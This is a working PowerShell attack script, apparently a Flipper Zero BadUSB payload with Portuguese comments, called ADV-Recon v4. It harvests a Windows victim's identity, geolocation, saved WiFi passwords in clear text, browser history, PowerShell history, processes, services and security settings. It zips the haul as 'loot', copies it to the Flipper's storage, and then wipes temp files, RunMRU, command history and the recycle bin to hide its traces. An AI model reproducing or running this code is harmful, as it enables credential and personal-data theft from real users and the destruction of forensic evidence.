<#
.SYNOPSIS
    ADV-Recon Flipper Edition — v4 (Mass Storage Manual)
    Recon completo. Exfiltracao: espera o operador conectar o Flipper em modo Mass Storage.
    Timeout de espera: 5 minutos.
#>

############################################################################################################################################################
# DEBUG LOG
############################################################################################################################################################

$DebugLogPath = $null
$FlipperDrive = $null

function Write-DebugLog {
    param([string]$Message)
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    $line = "[$ts] $Message"
    Write-Host $line -ForegroundColor Cyan
    if ($DebugLogPath) {
        try { Add-Content -Path $DebugLogPath -Value $line -ErrorAction SilentlyContinue } catch {}
    }
}

function Find-FlipperDrive {
    try {
        $vols = Get-WmiObject Win32_LogicalDisk -ErrorAction SilentlyContinue | Where-Object { $_.DriveType -eq 2 }
        foreach ($v in $vols) {
            if (Test-Path (Join-Path $v.DeviceID 'badusb')) {
                return $v.DeviceID
            }
        }
    } catch {}
    return $null
}

$FlipperDrive = Find-FlipperDrive
if ($FlipperDrive) {
    $DebugLogPath = Join-Path $FlipperDrive 'debug.log'
    '[DEBUG LOG INICIADO]' | Out-File -FilePath $DebugLogPath -Force
    Write-Host ('[+] Debug log: ' + $DebugLogPath) -ForegroundColor Green
} else {
    Write-Host '[*] Flipper ainda nao detectado. Debug.log sera criado quando conectares.' -ForegroundColor Yellow
}

Write-DebugLog '=== ADV-Recon v4 Iniciado ==='
Write-DebugLog ('Usuario: ' + $env:USERNAME)
Write-DebugLog ('Computador: ' + $env:COMPUTERNAME)

############################################################################################################################################################
# CONFIG
############################################################################################################################################################

$FlipperFallbackFolder = 'badusb'
$FlipperTimeoutSeconds = 300   # 5 minutos de espera
$OutputSubfolder = 'loot'

$FolderName = ($env:USERNAME + '-LOOT-' + (Get-Date -f 'yyyy-MM-dd_hh-mm'))
$ZIP = ($FolderName + '.zip')
$WorkDir = (Join-Path $env:TEMP $FolderName)
$ZipPath = (Join-Path $env:TEMP $ZIP)

############################################################################################################################################################
# ETAPA 1: WorkDir
############################################################################################################################################################

Write-DebugLog 'ETAPA 1/17: Criando WorkDir...'
try {
    New-Item -Path $WorkDir -ItemType Directory -Force | Out-Null
    Write-DebugLog ('OK: ' + $WorkDir)
} catch {
    Write-DebugLog ('ERRO: ' + $_.Exception.Message)
}
Start-Sleep -Seconds 3

############################################################################################################################################################
# ETAPA 2: Tree
############################################################################################################################################################

Write-DebugLog 'ETAPA 2/17: Arvore de diretorios...'
try {
    tree $Env:userprofile /a /f 2>$null > (Join-Path $WorkDir 'tree.txt')
    $sz = (Get-Item (Join-Path $WorkDir 'tree.txt')).Length
    Write-DebugLog ('OK: tree.txt (' + $sz + ' bytes)')
} catch {
    Write-DebugLog ('ERRO: ' + $_.Exception.Message)
}
Start-Sleep -Seconds 3

############################################################################################################################################################
# ETAPA 3: Historico PS
############################################################################################################################################################

Write-DebugLog 'ETAPA 3/17: Historico PowerShell...'
try {
    Copy-Item ($env:APPDATA + '\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt') -Destination (Join-Path $WorkDir 'Powershell-History.txt') -ErrorAction Stop
    Write-DebugLog 'OK: Historico copiado'
} catch {
    Write-DebugLog ('AVISO: ' + $_.Exception.Message)
}
Start-Sleep -Seconds 3

############################################################################################################################################################
# ETAPA 4: Dados do usuario
############################################################################################################################################################

Write-DebugLog 'ETAPA 4/17: Nome, email, localizacao...'

try {
    $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    Write-DebugLog ('OK: Nome = ' + $fullName)
} catch {
    $fullName = $env:UserName
    Write-DebugLog 'AVISO: Usando username como nome'
}

try {
    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
    Write-DebugLog ('OK: Email = ' + $email)
} catch {
    $email = 'No Email Detected'
    Write-DebugLog 'AVISO: Email nao encontrado'
}

try {
    Add-Type -AssemblyName System.Device
    $gw = New-Object System.Device.Location.GeoCoordinateWatcher
    $gw.Start()
    while (($gw.Status -ne 'Ready') -and ($gw.Permission -ne 'Denied')) { Start-Sleep -Milliseconds 100 }
    if ($gw.Permission -eq 'Denied') {
        $Lat = 'N/A'; $Lon = 'N/A'; $GeoLocStr = 'Permissao negada'
    } else {
        $Lat = $gw.Position.Location.Latitude
        $Lon = $gw.Position.Location.Longitude
        $GeoLocStr = ('Lat: ' + $Lat + ', Lon: ' + $Lon)
    }
    Write-DebugLog 'OK: Localizacao'
} catch {
    $Lat = 'N/A'; $Lon = 'N/A'; $GeoLocStr = 'Erro'
    Write-DebugLog ('ERRO: ' + $_.Exception.Message)
}
Start-Sleep -Seconds 3

############################################################################################################################################################
# ETAPA 5: Usuarios locais
############################################################################################################################################################

Write-DebugLog 'ETAPA 5/17: Usuarios locais...'
try {
    $luser = Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String
    Write-DebugLog 'OK'
} catch {
    $luser = 'Erro ao enumerar usuarios'
    Write-DebugLog ('ERRO: ' + $_.Exception.Message)
}
Start-Sleep -Seconds 3

############################################################################################################################################################
# ETAPA 6: UAC, LSASS, RDP
############################################################################################################################################################

Write-DebugLog 'ETAPA 6/17: UAC, LSASS, RDP...'

function Get-RegValue($k, $v) { (Get-ItemProperty $k $v).$v }

try {
    $c = Get-RegValue 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'ConsentPromptBehaviorAdmin'
    $p = Get-RegValue 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'PromptOnSecureDesktop'
    if ($c -eq 0 -and $p -eq 0)       { $UAC = 'Never notify' }
    elseif ($c -eq 5 -and $p -eq 0)   { $UAC = 'Notify (no dim)' }
    elseif ($c -eq 5 -and $p -eq 1)   { $UAC = 'Notify (default)' }
    elseif ($c -eq 2 -and $p -eq 1)   { $UAC = 'Always notify' }
    else                              { $UAC = 'Unknown' }
    Write-DebugLog ('OK: UAC = ' + $UAC)
} catch {
    $UAC = 'Error'
    Write-DebugLog ('ERRO UAC: ' + $_.Exception.Message)
}

try {
    $lsassProc = Get-Process -Name 'lsass' -ErrorAction Stop
    if ($lsassProc.ProtectedProcess) { $lsassState = 'LSASS protegido (PPL)' }
    else                             { $lsassState = 'LSASS NAO protegido' }
    Write-DebugLog ('OK: ' + $lsassState)
} catch {
    $lsassState = 'LSASS nao encontrado'
    Write-DebugLog ('ERRO LSASS: ' + $_.Exception.Message)
}

try {
    if ((Get-ItemProperty 'hklm:\System\CurrentControlSet\Control\Terminal Server').fDenyTSConnections -eq 0) {
        $RDP = 'RDP Habilitado'
    } else {
        $RDP = 'RDP Desabilitado'
    }
    Write-DebugLog ('OK: ' + $RDP)
} catch {
    $RDP = 'Erro ao verificar RDP'
    Write-DebugLog ('ERRO RDP: ' + $_.Exception.Message)
}
Start-Sleep -Seconds 3

############################################################################################################################################################
# ETAPA 7: Rede
############################################################################################################################################################

Write-DebugLog 'ETAPA 7/17: Rede...'

try {
    $computerPubIP = (Invoke-WebRequest 'ipinfo.io/ip' -UseBasicParsing -TimeoutSec 5).Content.Trim()
    Write-DebugLog ('OK: IP publico = ' + $computerPubIP)
} catch {
    $computerPubIP = 'Erro ao obter IP publico'
    Write-DebugLog ('ERRO: ' + $_.Exception.Message)
}

try {
    $localIP = Get-NetIPAddress -InterfaceAlias '*Ethernet*','*Wi-Fi*' -AddressFamily IPv4 -ErrorAction SilentlyContinue | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String
    Write-DebugLog 'OK: IPs locais'
} catch {
    $localIP = 'Erro ao obter IPs locais'
    Write-DebugLog 'ERRO IPs locais'
}

try {
    $MAC = Get-NetAdapter -Name '*Ethernet*','*Wi-Fi*' -ErrorAction SilentlyContinue | Select Name, MacAddress, Status | Out-String
    Write-DebugLog 'OK: MAC'
} catch {
    $MAC = 'Erro ao obter MAC'
    Write-DebugLog 'ERRO MAC'
}
Start-Sleep -Seconds 3

############################################################################################################################################################
# ETAPA 8: WiFi
############################################################################################################################################################

Write-DebugLog 'ETAPA 8/17: WiFi...'

try {
    $NearbyWifi = (netsh wlan show networks mode=Bssid 2>$null | ?{$_ -like 'SSID*' -or $_ -like '*Authentication*' -or $_ -like '*Encryption*'}).trim()
    if (-not $NearbyWifi) { $NearbyWifi = 'Nenhuma rede proxima' }
    Write-DebugLog 'OK: Redes proximas'
} catch {
    $NearbyWifi = 'Erro ou WiFi desabilitado'
    Write-DebugLog 'AVISO WiFi'
}

try {
    $wifiProfiles = (netsh wlan show profiles 2>$null) | Select-String ':(.+)$' | %{$n=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$n" key=clear 2>$null)} | Select-String 'Key Content\W+:(.+)$' | %{$p=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$n;PASSWORD=$p }} | Format-Table -AutoSize | Out-String
    if (-not $wifiProfiles.Trim()) { $wifiProfiles = 'Nenhum perfil WiFi' }
    Write-DebugLog 'OK: Perfis WiFi'
} catch {
    $wifiProfiles = 'Erro ao obter perfis WiFi'
    Write-DebugLog 'ERRO perfis WiFi'
}
Start-Sleep -Seconds 3

############################################################################################################################################################
# ETAPA 9: Sistema
############################################################################################################################################################

Write-DebugLog 'ETAPA 9/17: Specs do sistema...'

try {
    $cs = Get-CimInstance CIM_ComputerSystem
    $computerName = $cs.Name
    $computerModel = $cs.Model
    $computerManufacturer = $cs.Manufacturer
    Write-DebugLog ('OK: ' + $computerManufacturer + ' ' + $computerModel)
} catch {
    $computerName = $env:COMPUTERNAME; $computerModel = 'Unknown'; $computerManufacturer = 'Unknown'
    Write-DebugLog 'ERRO system info'
}

try { $computerBIOS = Get-CimInstance CIM_BIOSElement | Out-String; Write-DebugLog 'OK: BIOS' } catch { $computerBIOS = 'Erro'; Write-DebugLog 'ERRO BIOS' }
try { $computerOs = (Get-WMIObject win32_operatingsystem) | Select Caption, Version | Out-String; Write-DebugLog 'OK: OS' } catch { $computerOs = 'Erro'; Write-DebugLog 'ERRO OS' }
try { $computerCpu = Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List | Out-String; Write-DebugLog 'OK: CPU' } catch { $computerCpu = 'Erro'; Write-DebugLog 'ERRO CPU' }
try { $computerMainboard = Get-WmiObject Win32_BaseBoard | Format-List | Out-String; Write-DebugLog 'OK: Mainboard' } catch { $computerMainboard = 'Erro'; Write-DebugLog 'ERRO Mainboard' }
try { $computerRamCapacity = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { '{0:N1} GB' -f ($_.sum / 1GB) }; Write-DebugLog ('OK: RAM = ' + $computerRamCapacity) } catch { $computerRamCapacity = 'Erro'; Write-DebugLog 'ERRO RAM' }
try { $computerRam = Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name='Capacity';Expression={ '{0:N1} GB' -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table | Out-String; Write-DebugLog 'OK: RAM detail' } catch { $computerRam = 'Erro'; Write-DebugLog 'ERRO RAM detail' }
Start-Sleep -Seconds 3

############################################################################################################################################################
# ETAPA 10: HDs, COM, Video, Network
############################################################################################################################################################

Write-DebugLog 'ETAPA 10/17: Discos, dispositivos, video...'

try {
    $dt = @{2='Removivel'; 3='Fixo'; 4='Rede'; 5='CD-ROM'}
    $Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name='Tipo';Expression={$dt.item([int]$_.DriveType)}}, FileSystem, VolumeSerialNumber, @{Name='Size_GB';Expression={'{0:N1} GB' -f ($_.Size / 1Gb)}}, @{Name='Free_GB';Expression={'{0:N1} GB' -f ($_.FreeSpace / 1Gb)}}, @{Name='Free_%';Expression={'{0:N1}%' -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName, Tipo, FileSystem, VolumeSerialNumber, @{ Name='Size GB'; Expression={$_.Size_GB}; align='right'; }, @{ Name='Free GB'; Expression={$_.Free_GB}; align='right'; }, @{ Name='Free %'; Expression={$_.Free_%}; align='right'; } | Out-String
    Write-DebugLog 'OK: HDs'
} catch { $Hdds = 'Erro'; Write-DebugLog 'ERRO HDs' }

try { $COMDevices = Get-Wmiobject Win32_USBControllerDevice -ErrorAction SilentlyContinue | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table | Out-String -width 250; Write-DebugLog 'OK: COM/USB' } catch { $COMDevices = 'Erro'; Write-DebugLog 'ERRO COM' }
try { $NetworkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null } | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress | Out-String -width 250; Write-DebugLog 'OK: Network adapters' } catch { $NetworkAdapters = 'Erro'; Write-DebugLog 'ERRO adapters' }
try { $videocard = Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String -width 250; Write-DebugLog 'OK: Video' } catch { $videocard = 'Erro'; Write-DebugLog 'ERRO video' }
Start-Sleep -Seconds 3

############################################################################################################################################################
# ETAPA 11: Processos, Conexoes, Servicos
############################################################################################################################################################

Write-DebugLog 'ETAPA 11/17: Processos, conexoes, servicos...'

try { $process = Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine | Out-String -width 250; Write-DebugLog 'OK: Processos' } catch { $process = 'Erro'; Write-DebugLog 'ERRO processos' }

try {
    $listener = Get-NetTCPConnection -ErrorAction SilentlyContinue | select @{Name='LocalAddress';Expression={$_.LocalAddress + ':' + $_.LocalPort}}, @{Name='RemoteAddress';Expression={$_.RemoteAddress + ':' + $_.RemotePort}}, State, AppliedSetting, OwningProcess
    $listener = $listener | foreach-object {
        $li = $_
        $pi = ($process | where { [int]$_.Handle -like [int]$li.OwningProcess })
        new-object PSObject -property @{
          'LocalAddress' = $li.LocalAddress
          'RemoteAddress' = $li.RemoteAddress
          'State' = $li.State
          'AppliedSetting' = $li.AppliedSetting
          'OwningProcess' = $li.OwningProcess
          'ProcessName' = $pi.ProcessName
        }
    } | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String -width 250
    Write-DebugLog 'OK: Conexoes TCP'
} catch { $listener = 'Erro'; Write-DebugLog 'ERRO conexoes' }

try { $service = Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name='Sort';Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName | Out-String -width 250; Write-DebugLog 'OK: Servicos' } catch { $service = 'Erro'; Write-DebugLog 'ERRO servicos' }
Start-Sleep -Seconds 3

############################################################################################################################################################
# ETAPA 12: Software, Drivers
############################################################################################################################################################

Write-DebugLog 'ETAPA 12/17: Software e drivers...'

try { $software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -width 250; Write-DebugLog 'OK: Software' } catch { $software = 'Erro'; Write-DebugLog 'ERRO software' }
try { $drivers = Get-WmiObject Win32_PnPSignedDriver | where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String -width 250; Write-DebugLog 'OK: Drivers' } catch { $drivers = 'Erro'; Write-DebugLog 'ERRO drivers' }
Start-Sleep -Seconds 3

############################################################################################################################################################
# ETAPA 13: Startup, Tasks, Sessions, Recent
############################################################################################################################################################

Write-DebugLog 'ETAPA 13/17: Startup, tasks, sessoes, recentes...'

try { $StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath('Startup')) -ErrorAction SilentlyContinue).Name -join ', '; if (-not $StartUp) { $StartUp = '(vazio)' }; Write-DebugLog 'OK: Startup' } catch { $StartUp = 'Erro'; Write-DebugLog 'ERRO startup' }
try { $ScheduledTasks = (Get-ScheduledTask -ErrorAction SilentlyContinue | Select TaskName, State | Format-Table -AutoSize | Out-String); Write-DebugLog 'OK: Scheduled Tasks' } catch { $ScheduledTasks = 'Erro'; Write-DebugLog 'ERRO tasks' }
try { $klist = klist sessions 2>$null; if (-not $klist) { $klist = 'Nenhuma sessao Kerberos' }; Write-DebugLog 'OK: Sessoes' } catch { $klist = 'Erro'; Write-DebugLog 'ERRO sessoes' }
try { $RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime | Out-String; Write-DebugLog 'OK: Recent files' } catch { $RecentFiles = 'Erro'; Write-DebugLog 'ERRO recent files' }
Start-Sleep -Seconds 3

############################################################################################################################################################
# ETAPA 14: Browser Data
############################################################################################################################################################

Write-DebugLog 'ETAPA 14/17: Dados dos browsers...'

function Get-BrowserData {
    param([string]$Browser, [string]$DataType)
    $rx = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   ) { $p = ($Env:USERPROFILE + '\AppData\Local\Google\Chrome\User Data\Default\History') }
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' ) { $p = ($Env:USERPROFILE + '\AppData\Local\Google\Chrome\User Data\Default\Bookmarks') }
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   ) { $p = ($Env:USERPROFILE + '\AppData\Local\Microsoft\Edge\User Data\Default\History') }
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' ) { $p = ($env:USERPROFILE + '\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks') }
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   ) { $p = ($Env:USERPROFILE + '\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite') }
    else { return }
    try {
        $vals = Get-Content -Path $p -ErrorAction SilentlyContinue | Select-String -AllMatches $rx | %{($_.Matches).Value} | Sort -Unique
        $vals | ForEach-Object {
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    } catch {}
}

$browserLog = Join-Path $WorkDir 'BrowserData.txt'
try { Get-BrowserData -Browser 'edge'    -DataType 'history'   >> $browserLog 2>$null; Write-DebugLog 'OK: Edge history' }   catch { Write-DebugLog 'AVISO: Edge history' }
try { Get-BrowserData -Browser 'edge'    -DataType 'bookmarks' >> $browserLog 2>$null; Write-DebugLog 'OK: Edge bookmarks' } catch { Write-DebugLog 'AVISO: Edge bookmarks' }
try { Get-BrowserData -Browser 'chrome'  -DataType 'history'   >> $browserLog 2>$null; Write-DebugLog 'OK: Chrome history' }  catch { Write-DebugLog 'AVISO: Chrome history' }
try { Get-BrowserData -Browser 'chrome'  -DataType 'bookmarks' >> $browserLog 2>$null; Write-DebugLog 'OK: Chrome bookmarks' } catch { Write-DebugLog 'AVISO: Chrome bookmarks' }
try { Get-BrowserData -Browser 'firefox' -DataType 'history'   >> $browserLog 2>$null; Write-DebugLog 'OK: Firefox history' }  catch { Write-DebugLog 'AVISO: Firefox history' }
Start-Sleep -Seconds 3

############################################################################################################################################################
# ETAPA 15: Compilar relatorio e ZIP
############################################################################################################################################################

Write-DebugLog 'ETAPA 15/17: Compilando relatorio...'

$output = @"
############################################################################################################################################################
# ADV-Recon Flipper Edition — v4
############################################################################################################################################################

Full Name: $fullName
Email: $email

GeoLocation:
Latitude:  $Lat
Longitude: $Lon
Raw: $GeoLocStr

------------------------------------------------------------------------------------------------------------------------------
Local Users:
$luser
------------------------------------------------------------------------------------------------------------------------------
UAC State: $UAC
LSASS State: $lsassState
RDP State: $RDP
------------------------------------------------------------------------------------------------------------------------------
Public IP: $computerPubIP
Local IPs:
$localIP
MAC:
$MAC
------------------------------------------------------------------------------------------------------------------------------
Computer Name: $computerName
Model: $computerModel
Manufacturer: $computerManufacturer
BIOS:
$computerBIOS
OS:
$computerOs
CPU:
$computerCpu
Mainboard:
$computerMainboard
Ram Capacity: $computerRamCapacity
Total installed Ram:
$computerRam
Video Card:
$videocard
------------------------------------------------------------------------------------------------------------------------------
StartUp: $StartUp
------------------------------------------------------------------------------------------------------------------------------
Scheduled Tasks:
$ScheduledTasks
------------------------------------------------------------------------------------------------------------------------------
Sessions:
$klist
------------------------------------------------------------------------------------------------------------------------------
Recent Files:
$RecentFiles
------------------------------------------------------------------------------------------------------------------------------
Hard-Drives:
$Hdds
COM Devices:
$COMDevices
------------------------------------------------------------------------------------------------------------------------------
Network Adapters:
$NetworkAdapters
------------------------------------------------------------------------------------------------------------------------------
Nearby Wifi:
$NearbyWifi
Wifi Profiles:
$wifiProfiles
------------------------------------------------------------------------------------------------------------------------------
Processes:
$process
------------------------------------------------------------------------------------------------------------------------------
Listeners:
$listener
------------------------------------------------------------------------------------------------------------------------------
Services:
$service
------------------------------------------------------------------------------------------------------------------------------
Installed Software:
$software
------------------------------------------------------------------------------------------------------------------------------
Drivers:
$drivers
------------------------------------------------------------------------------------------------------------------------------
"@

try {
    $output > (Join-Path $WorkDir 'computerData.txt')
    Write-DebugLog 'OK: Relatorio compilado'
} catch {
    Write-DebugLog ('ERRO: ' + $_.Exception.Message)
}

Write-DebugLog 'Compactando ZIP...'
try {
    Compress-Archive -Path $WorkDir -DestinationPath $ZipPath -Force
    $zipSize = (Get-Item $ZipPath).Length
    Write-DebugLog ('OK: ZIP criado (' + $zipSize + ' bytes)')
} catch {
    Write-DebugLog ('ERRO ZIP: ' + $_.Exception.Message)
}
Start-Sleep -Seconds 3

############################################################################################################################################################
# ETAPA 16: Esperar pelo Flipper (Mass Storage manual)
############################################################################################################################################################

Write-DebugLog 'ETAPA 16/17: Aguardando Flipper Mass Storage...'

Write-Host ''
Write-Host '================================================================' -ForegroundColor Yellow
Write-Host '  RECON CONCLUIDO. ZIP PRONTO EM:' -ForegroundColor Yellow
Write-Host ('  ' + $ZipPath) -ForegroundColor White
Write-Host ''
Write-Host '  >>> AGORA:' -ForegroundColor Green
Write-Host '  1. Desconecta o Flipper do PC' -ForegroundColor Green
Write-Host '  2. No Flipper, abre: USB Mass Storage' -ForegroundColor Green
Write-Host '  3. Reconecta o Flipper ao PC' -ForegroundColor Green
Write-Host ''
Write-Host '  O script vai detectar o Flipper e copiar o ZIP automaticamente.' -ForegroundColor Cyan
Write-Host '  Timeout: 5 minutos.' -ForegroundColor Cyan
Write-Host '================================================================' -ForegroundColor Yellow
Write-Host ''

$driveFound = $null
$elapsed = 0

while ($elapsed -lt $FlipperTimeoutSeconds -and -not $driveFound) {
    try {
        $vols = Get-WmiObject Win32_LogicalDisk -ErrorAction SilentlyContinue | Where-Object { $_.DriveType -eq 2 }
    } catch { $vols = @() }

    foreach ($v in $vols) {
        $mp = Join-Path $v.DeviceID $FlipperFallbackFolder
        if (Test-Path $mp) {
            $driveFound = $v.DeviceID
            Write-Host ('[+] FLIPPER DETECTADO: ' + $driveFound) -ForegroundColor Green
            Write-DebugLog ('Flipper detectado: ' + $driveFound)
            break
        }
    }

    if (-not $driveFound) {
        $min = [math]::Floor(($FlipperTimeoutSeconds - $elapsed) / 60)
        $sec = ($FlipperTimeoutSeconds - $elapsed) % 60
        Write-Host ("`r[*] Aguardando Flipper... ${min}m ${sec}s restantes   ") -NoNewline
        Start-Sleep -Seconds 5
        $elapsed += 5
    }
}

Write-Host ''

$exfilSuccess = $false

if ($driveFound) {
    $FlipperDrive = $driveFound
    $DebugLogPath = Join-Path $driveFound 'debug.log'
    Write-DebugLog '=== Reconectado ao Flipper ==='
    
    $destFolder = Join-Path $driveFound ($OutputSubfolder + '\' + $env:COMPUTERNAME + '-' + (Get-Date -Format 'yyyy-MM-dd_HH-mm'))
    Write-DebugLog ('Destino: ' + $destFolder)
    
    try {
        New-Item -Path $destFolder -ItemType Directory -Force | Out-Null
        Write-DebugLog 'OK: Pasta destino criada'
        $destFile = Join-Path $destFolder (Split-Path $ZipPath -Leaf)
        Copy-Item -Path $ZipPath -Destination $destFile -Force
        $srcHash = (Get-FileHash $ZipPath -Algorithm MD5).Hash
        $dstHash = (Get-FileHash $destFile -Algorithm MD5).Hash
        if ($srcHash -eq $dstHash) {
            Write-DebugLog ('SUCESSO: Hash verificado — ' + $srcHash)
            Write-Host ('[+] EXFILTRACAO CONCLUIDA!') -ForegroundColor Green
            Write-Host ('    ' + $destFile) -ForegroundColor White
            $exfilSuccess = $true
        } else {
            Write-DebugLog ('ERRO: Hash mismatch')
            Write-Host '[-] ERRO: Hash mismatch na copia' -ForegroundColor Red
        }
    } catch {
        Write-DebugLog ('ERRO copia: ' + $_.Exception.Message)
        Write-Host ('[-] ERRO: ' + $_.Exception.Message) -ForegroundColor Red
    }
} else {
    Write-DebugLog 'TIMEOUT: Flipper nao detectado'
    Write-Host '[-] TIMEOUT: Flipper nao foi conectado em 5 minutos' -ForegroundColor Red
    Write-Host ('    ZIP preservado em: ' + $ZipPath) -ForegroundColor Yellow
}
Start-Sleep -Seconds 3

############################################################################################################################################################
# ETAPA 17: Cleanup
############################################################################################################################################################

Write-DebugLog 'ETAPA 17/17: Limpeza...'

if ($exfilSuccess) {
    Write-DebugLog 'Exfiltracao OK — cleanup completo...'
    try { Remove-Item $WorkDir -Recurse -Force -ErrorAction SilentlyContinue; Write-DebugLog 'OK: WorkDir removido' } catch { Write-DebugLog 'AVISO: WorkDir' }
    try { Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue; Write-DebugLog 'OK: ZIP removido' } catch { Write-DebugLog 'AVISO: ZIP' }
    try { Remove-Item ($env:TEMP + '\*') -Recurse -Force -ErrorAction SilentlyContinue; Write-DebugLog 'OK: TEMP limpo' } catch { Write-DebugLog 'AVISO: TEMP' }
    try { reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 2>$null; Write-DebugLog 'OK: RunMRU' } catch { Write-DebugLog 'AVISO: RunMRU' }
    try { Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue; Write-DebugLog 'OK: PS History' } catch { Write-DebugLog 'AVISO: PS History' }
    try { Clear-RecycleBin -Force -ErrorAction SilentlyContinue; Write-DebugLog 'OK: Recycle Bin' } catch { Write-DebugLog 'AVISO: Recycle Bin' }
    Write-Host '[+] Cleanup concluido.' -ForegroundColor Green
} else {
    Write-DebugLog ('Exfiltracao FALHOU — ZIP preservado em ' + $ZipPath)
    try { reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 2>$null } catch {}
    try { Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue } catch {}
}
Start-Sleep -Seconds 2

############################################################################################################################################################
# FINAL
############################################################################################################################################################

Write-DebugLog '=== ADV-Recon Finalizado ==='

Write-Host ''
Write-Host '================================================================' -ForegroundColor Cyan
if ($exfilSuccess) {
    Write-Host '  SUCESSO — Dados no SD do Flipper.' -ForegroundColor Green
} else {
    Write-Host '  ZIP em: ' + $ZipPath -ForegroundColor Yellow
}
Write-Host '================================================================' -ForegroundColor Cyan

try {
    $done = New-Object -ComObject Wscript.Shell
    $done.Popup('ADV-Recon Concluido', 3) | Out-Null
} catch {}

Read-Host 'Pressione Enter para fechar'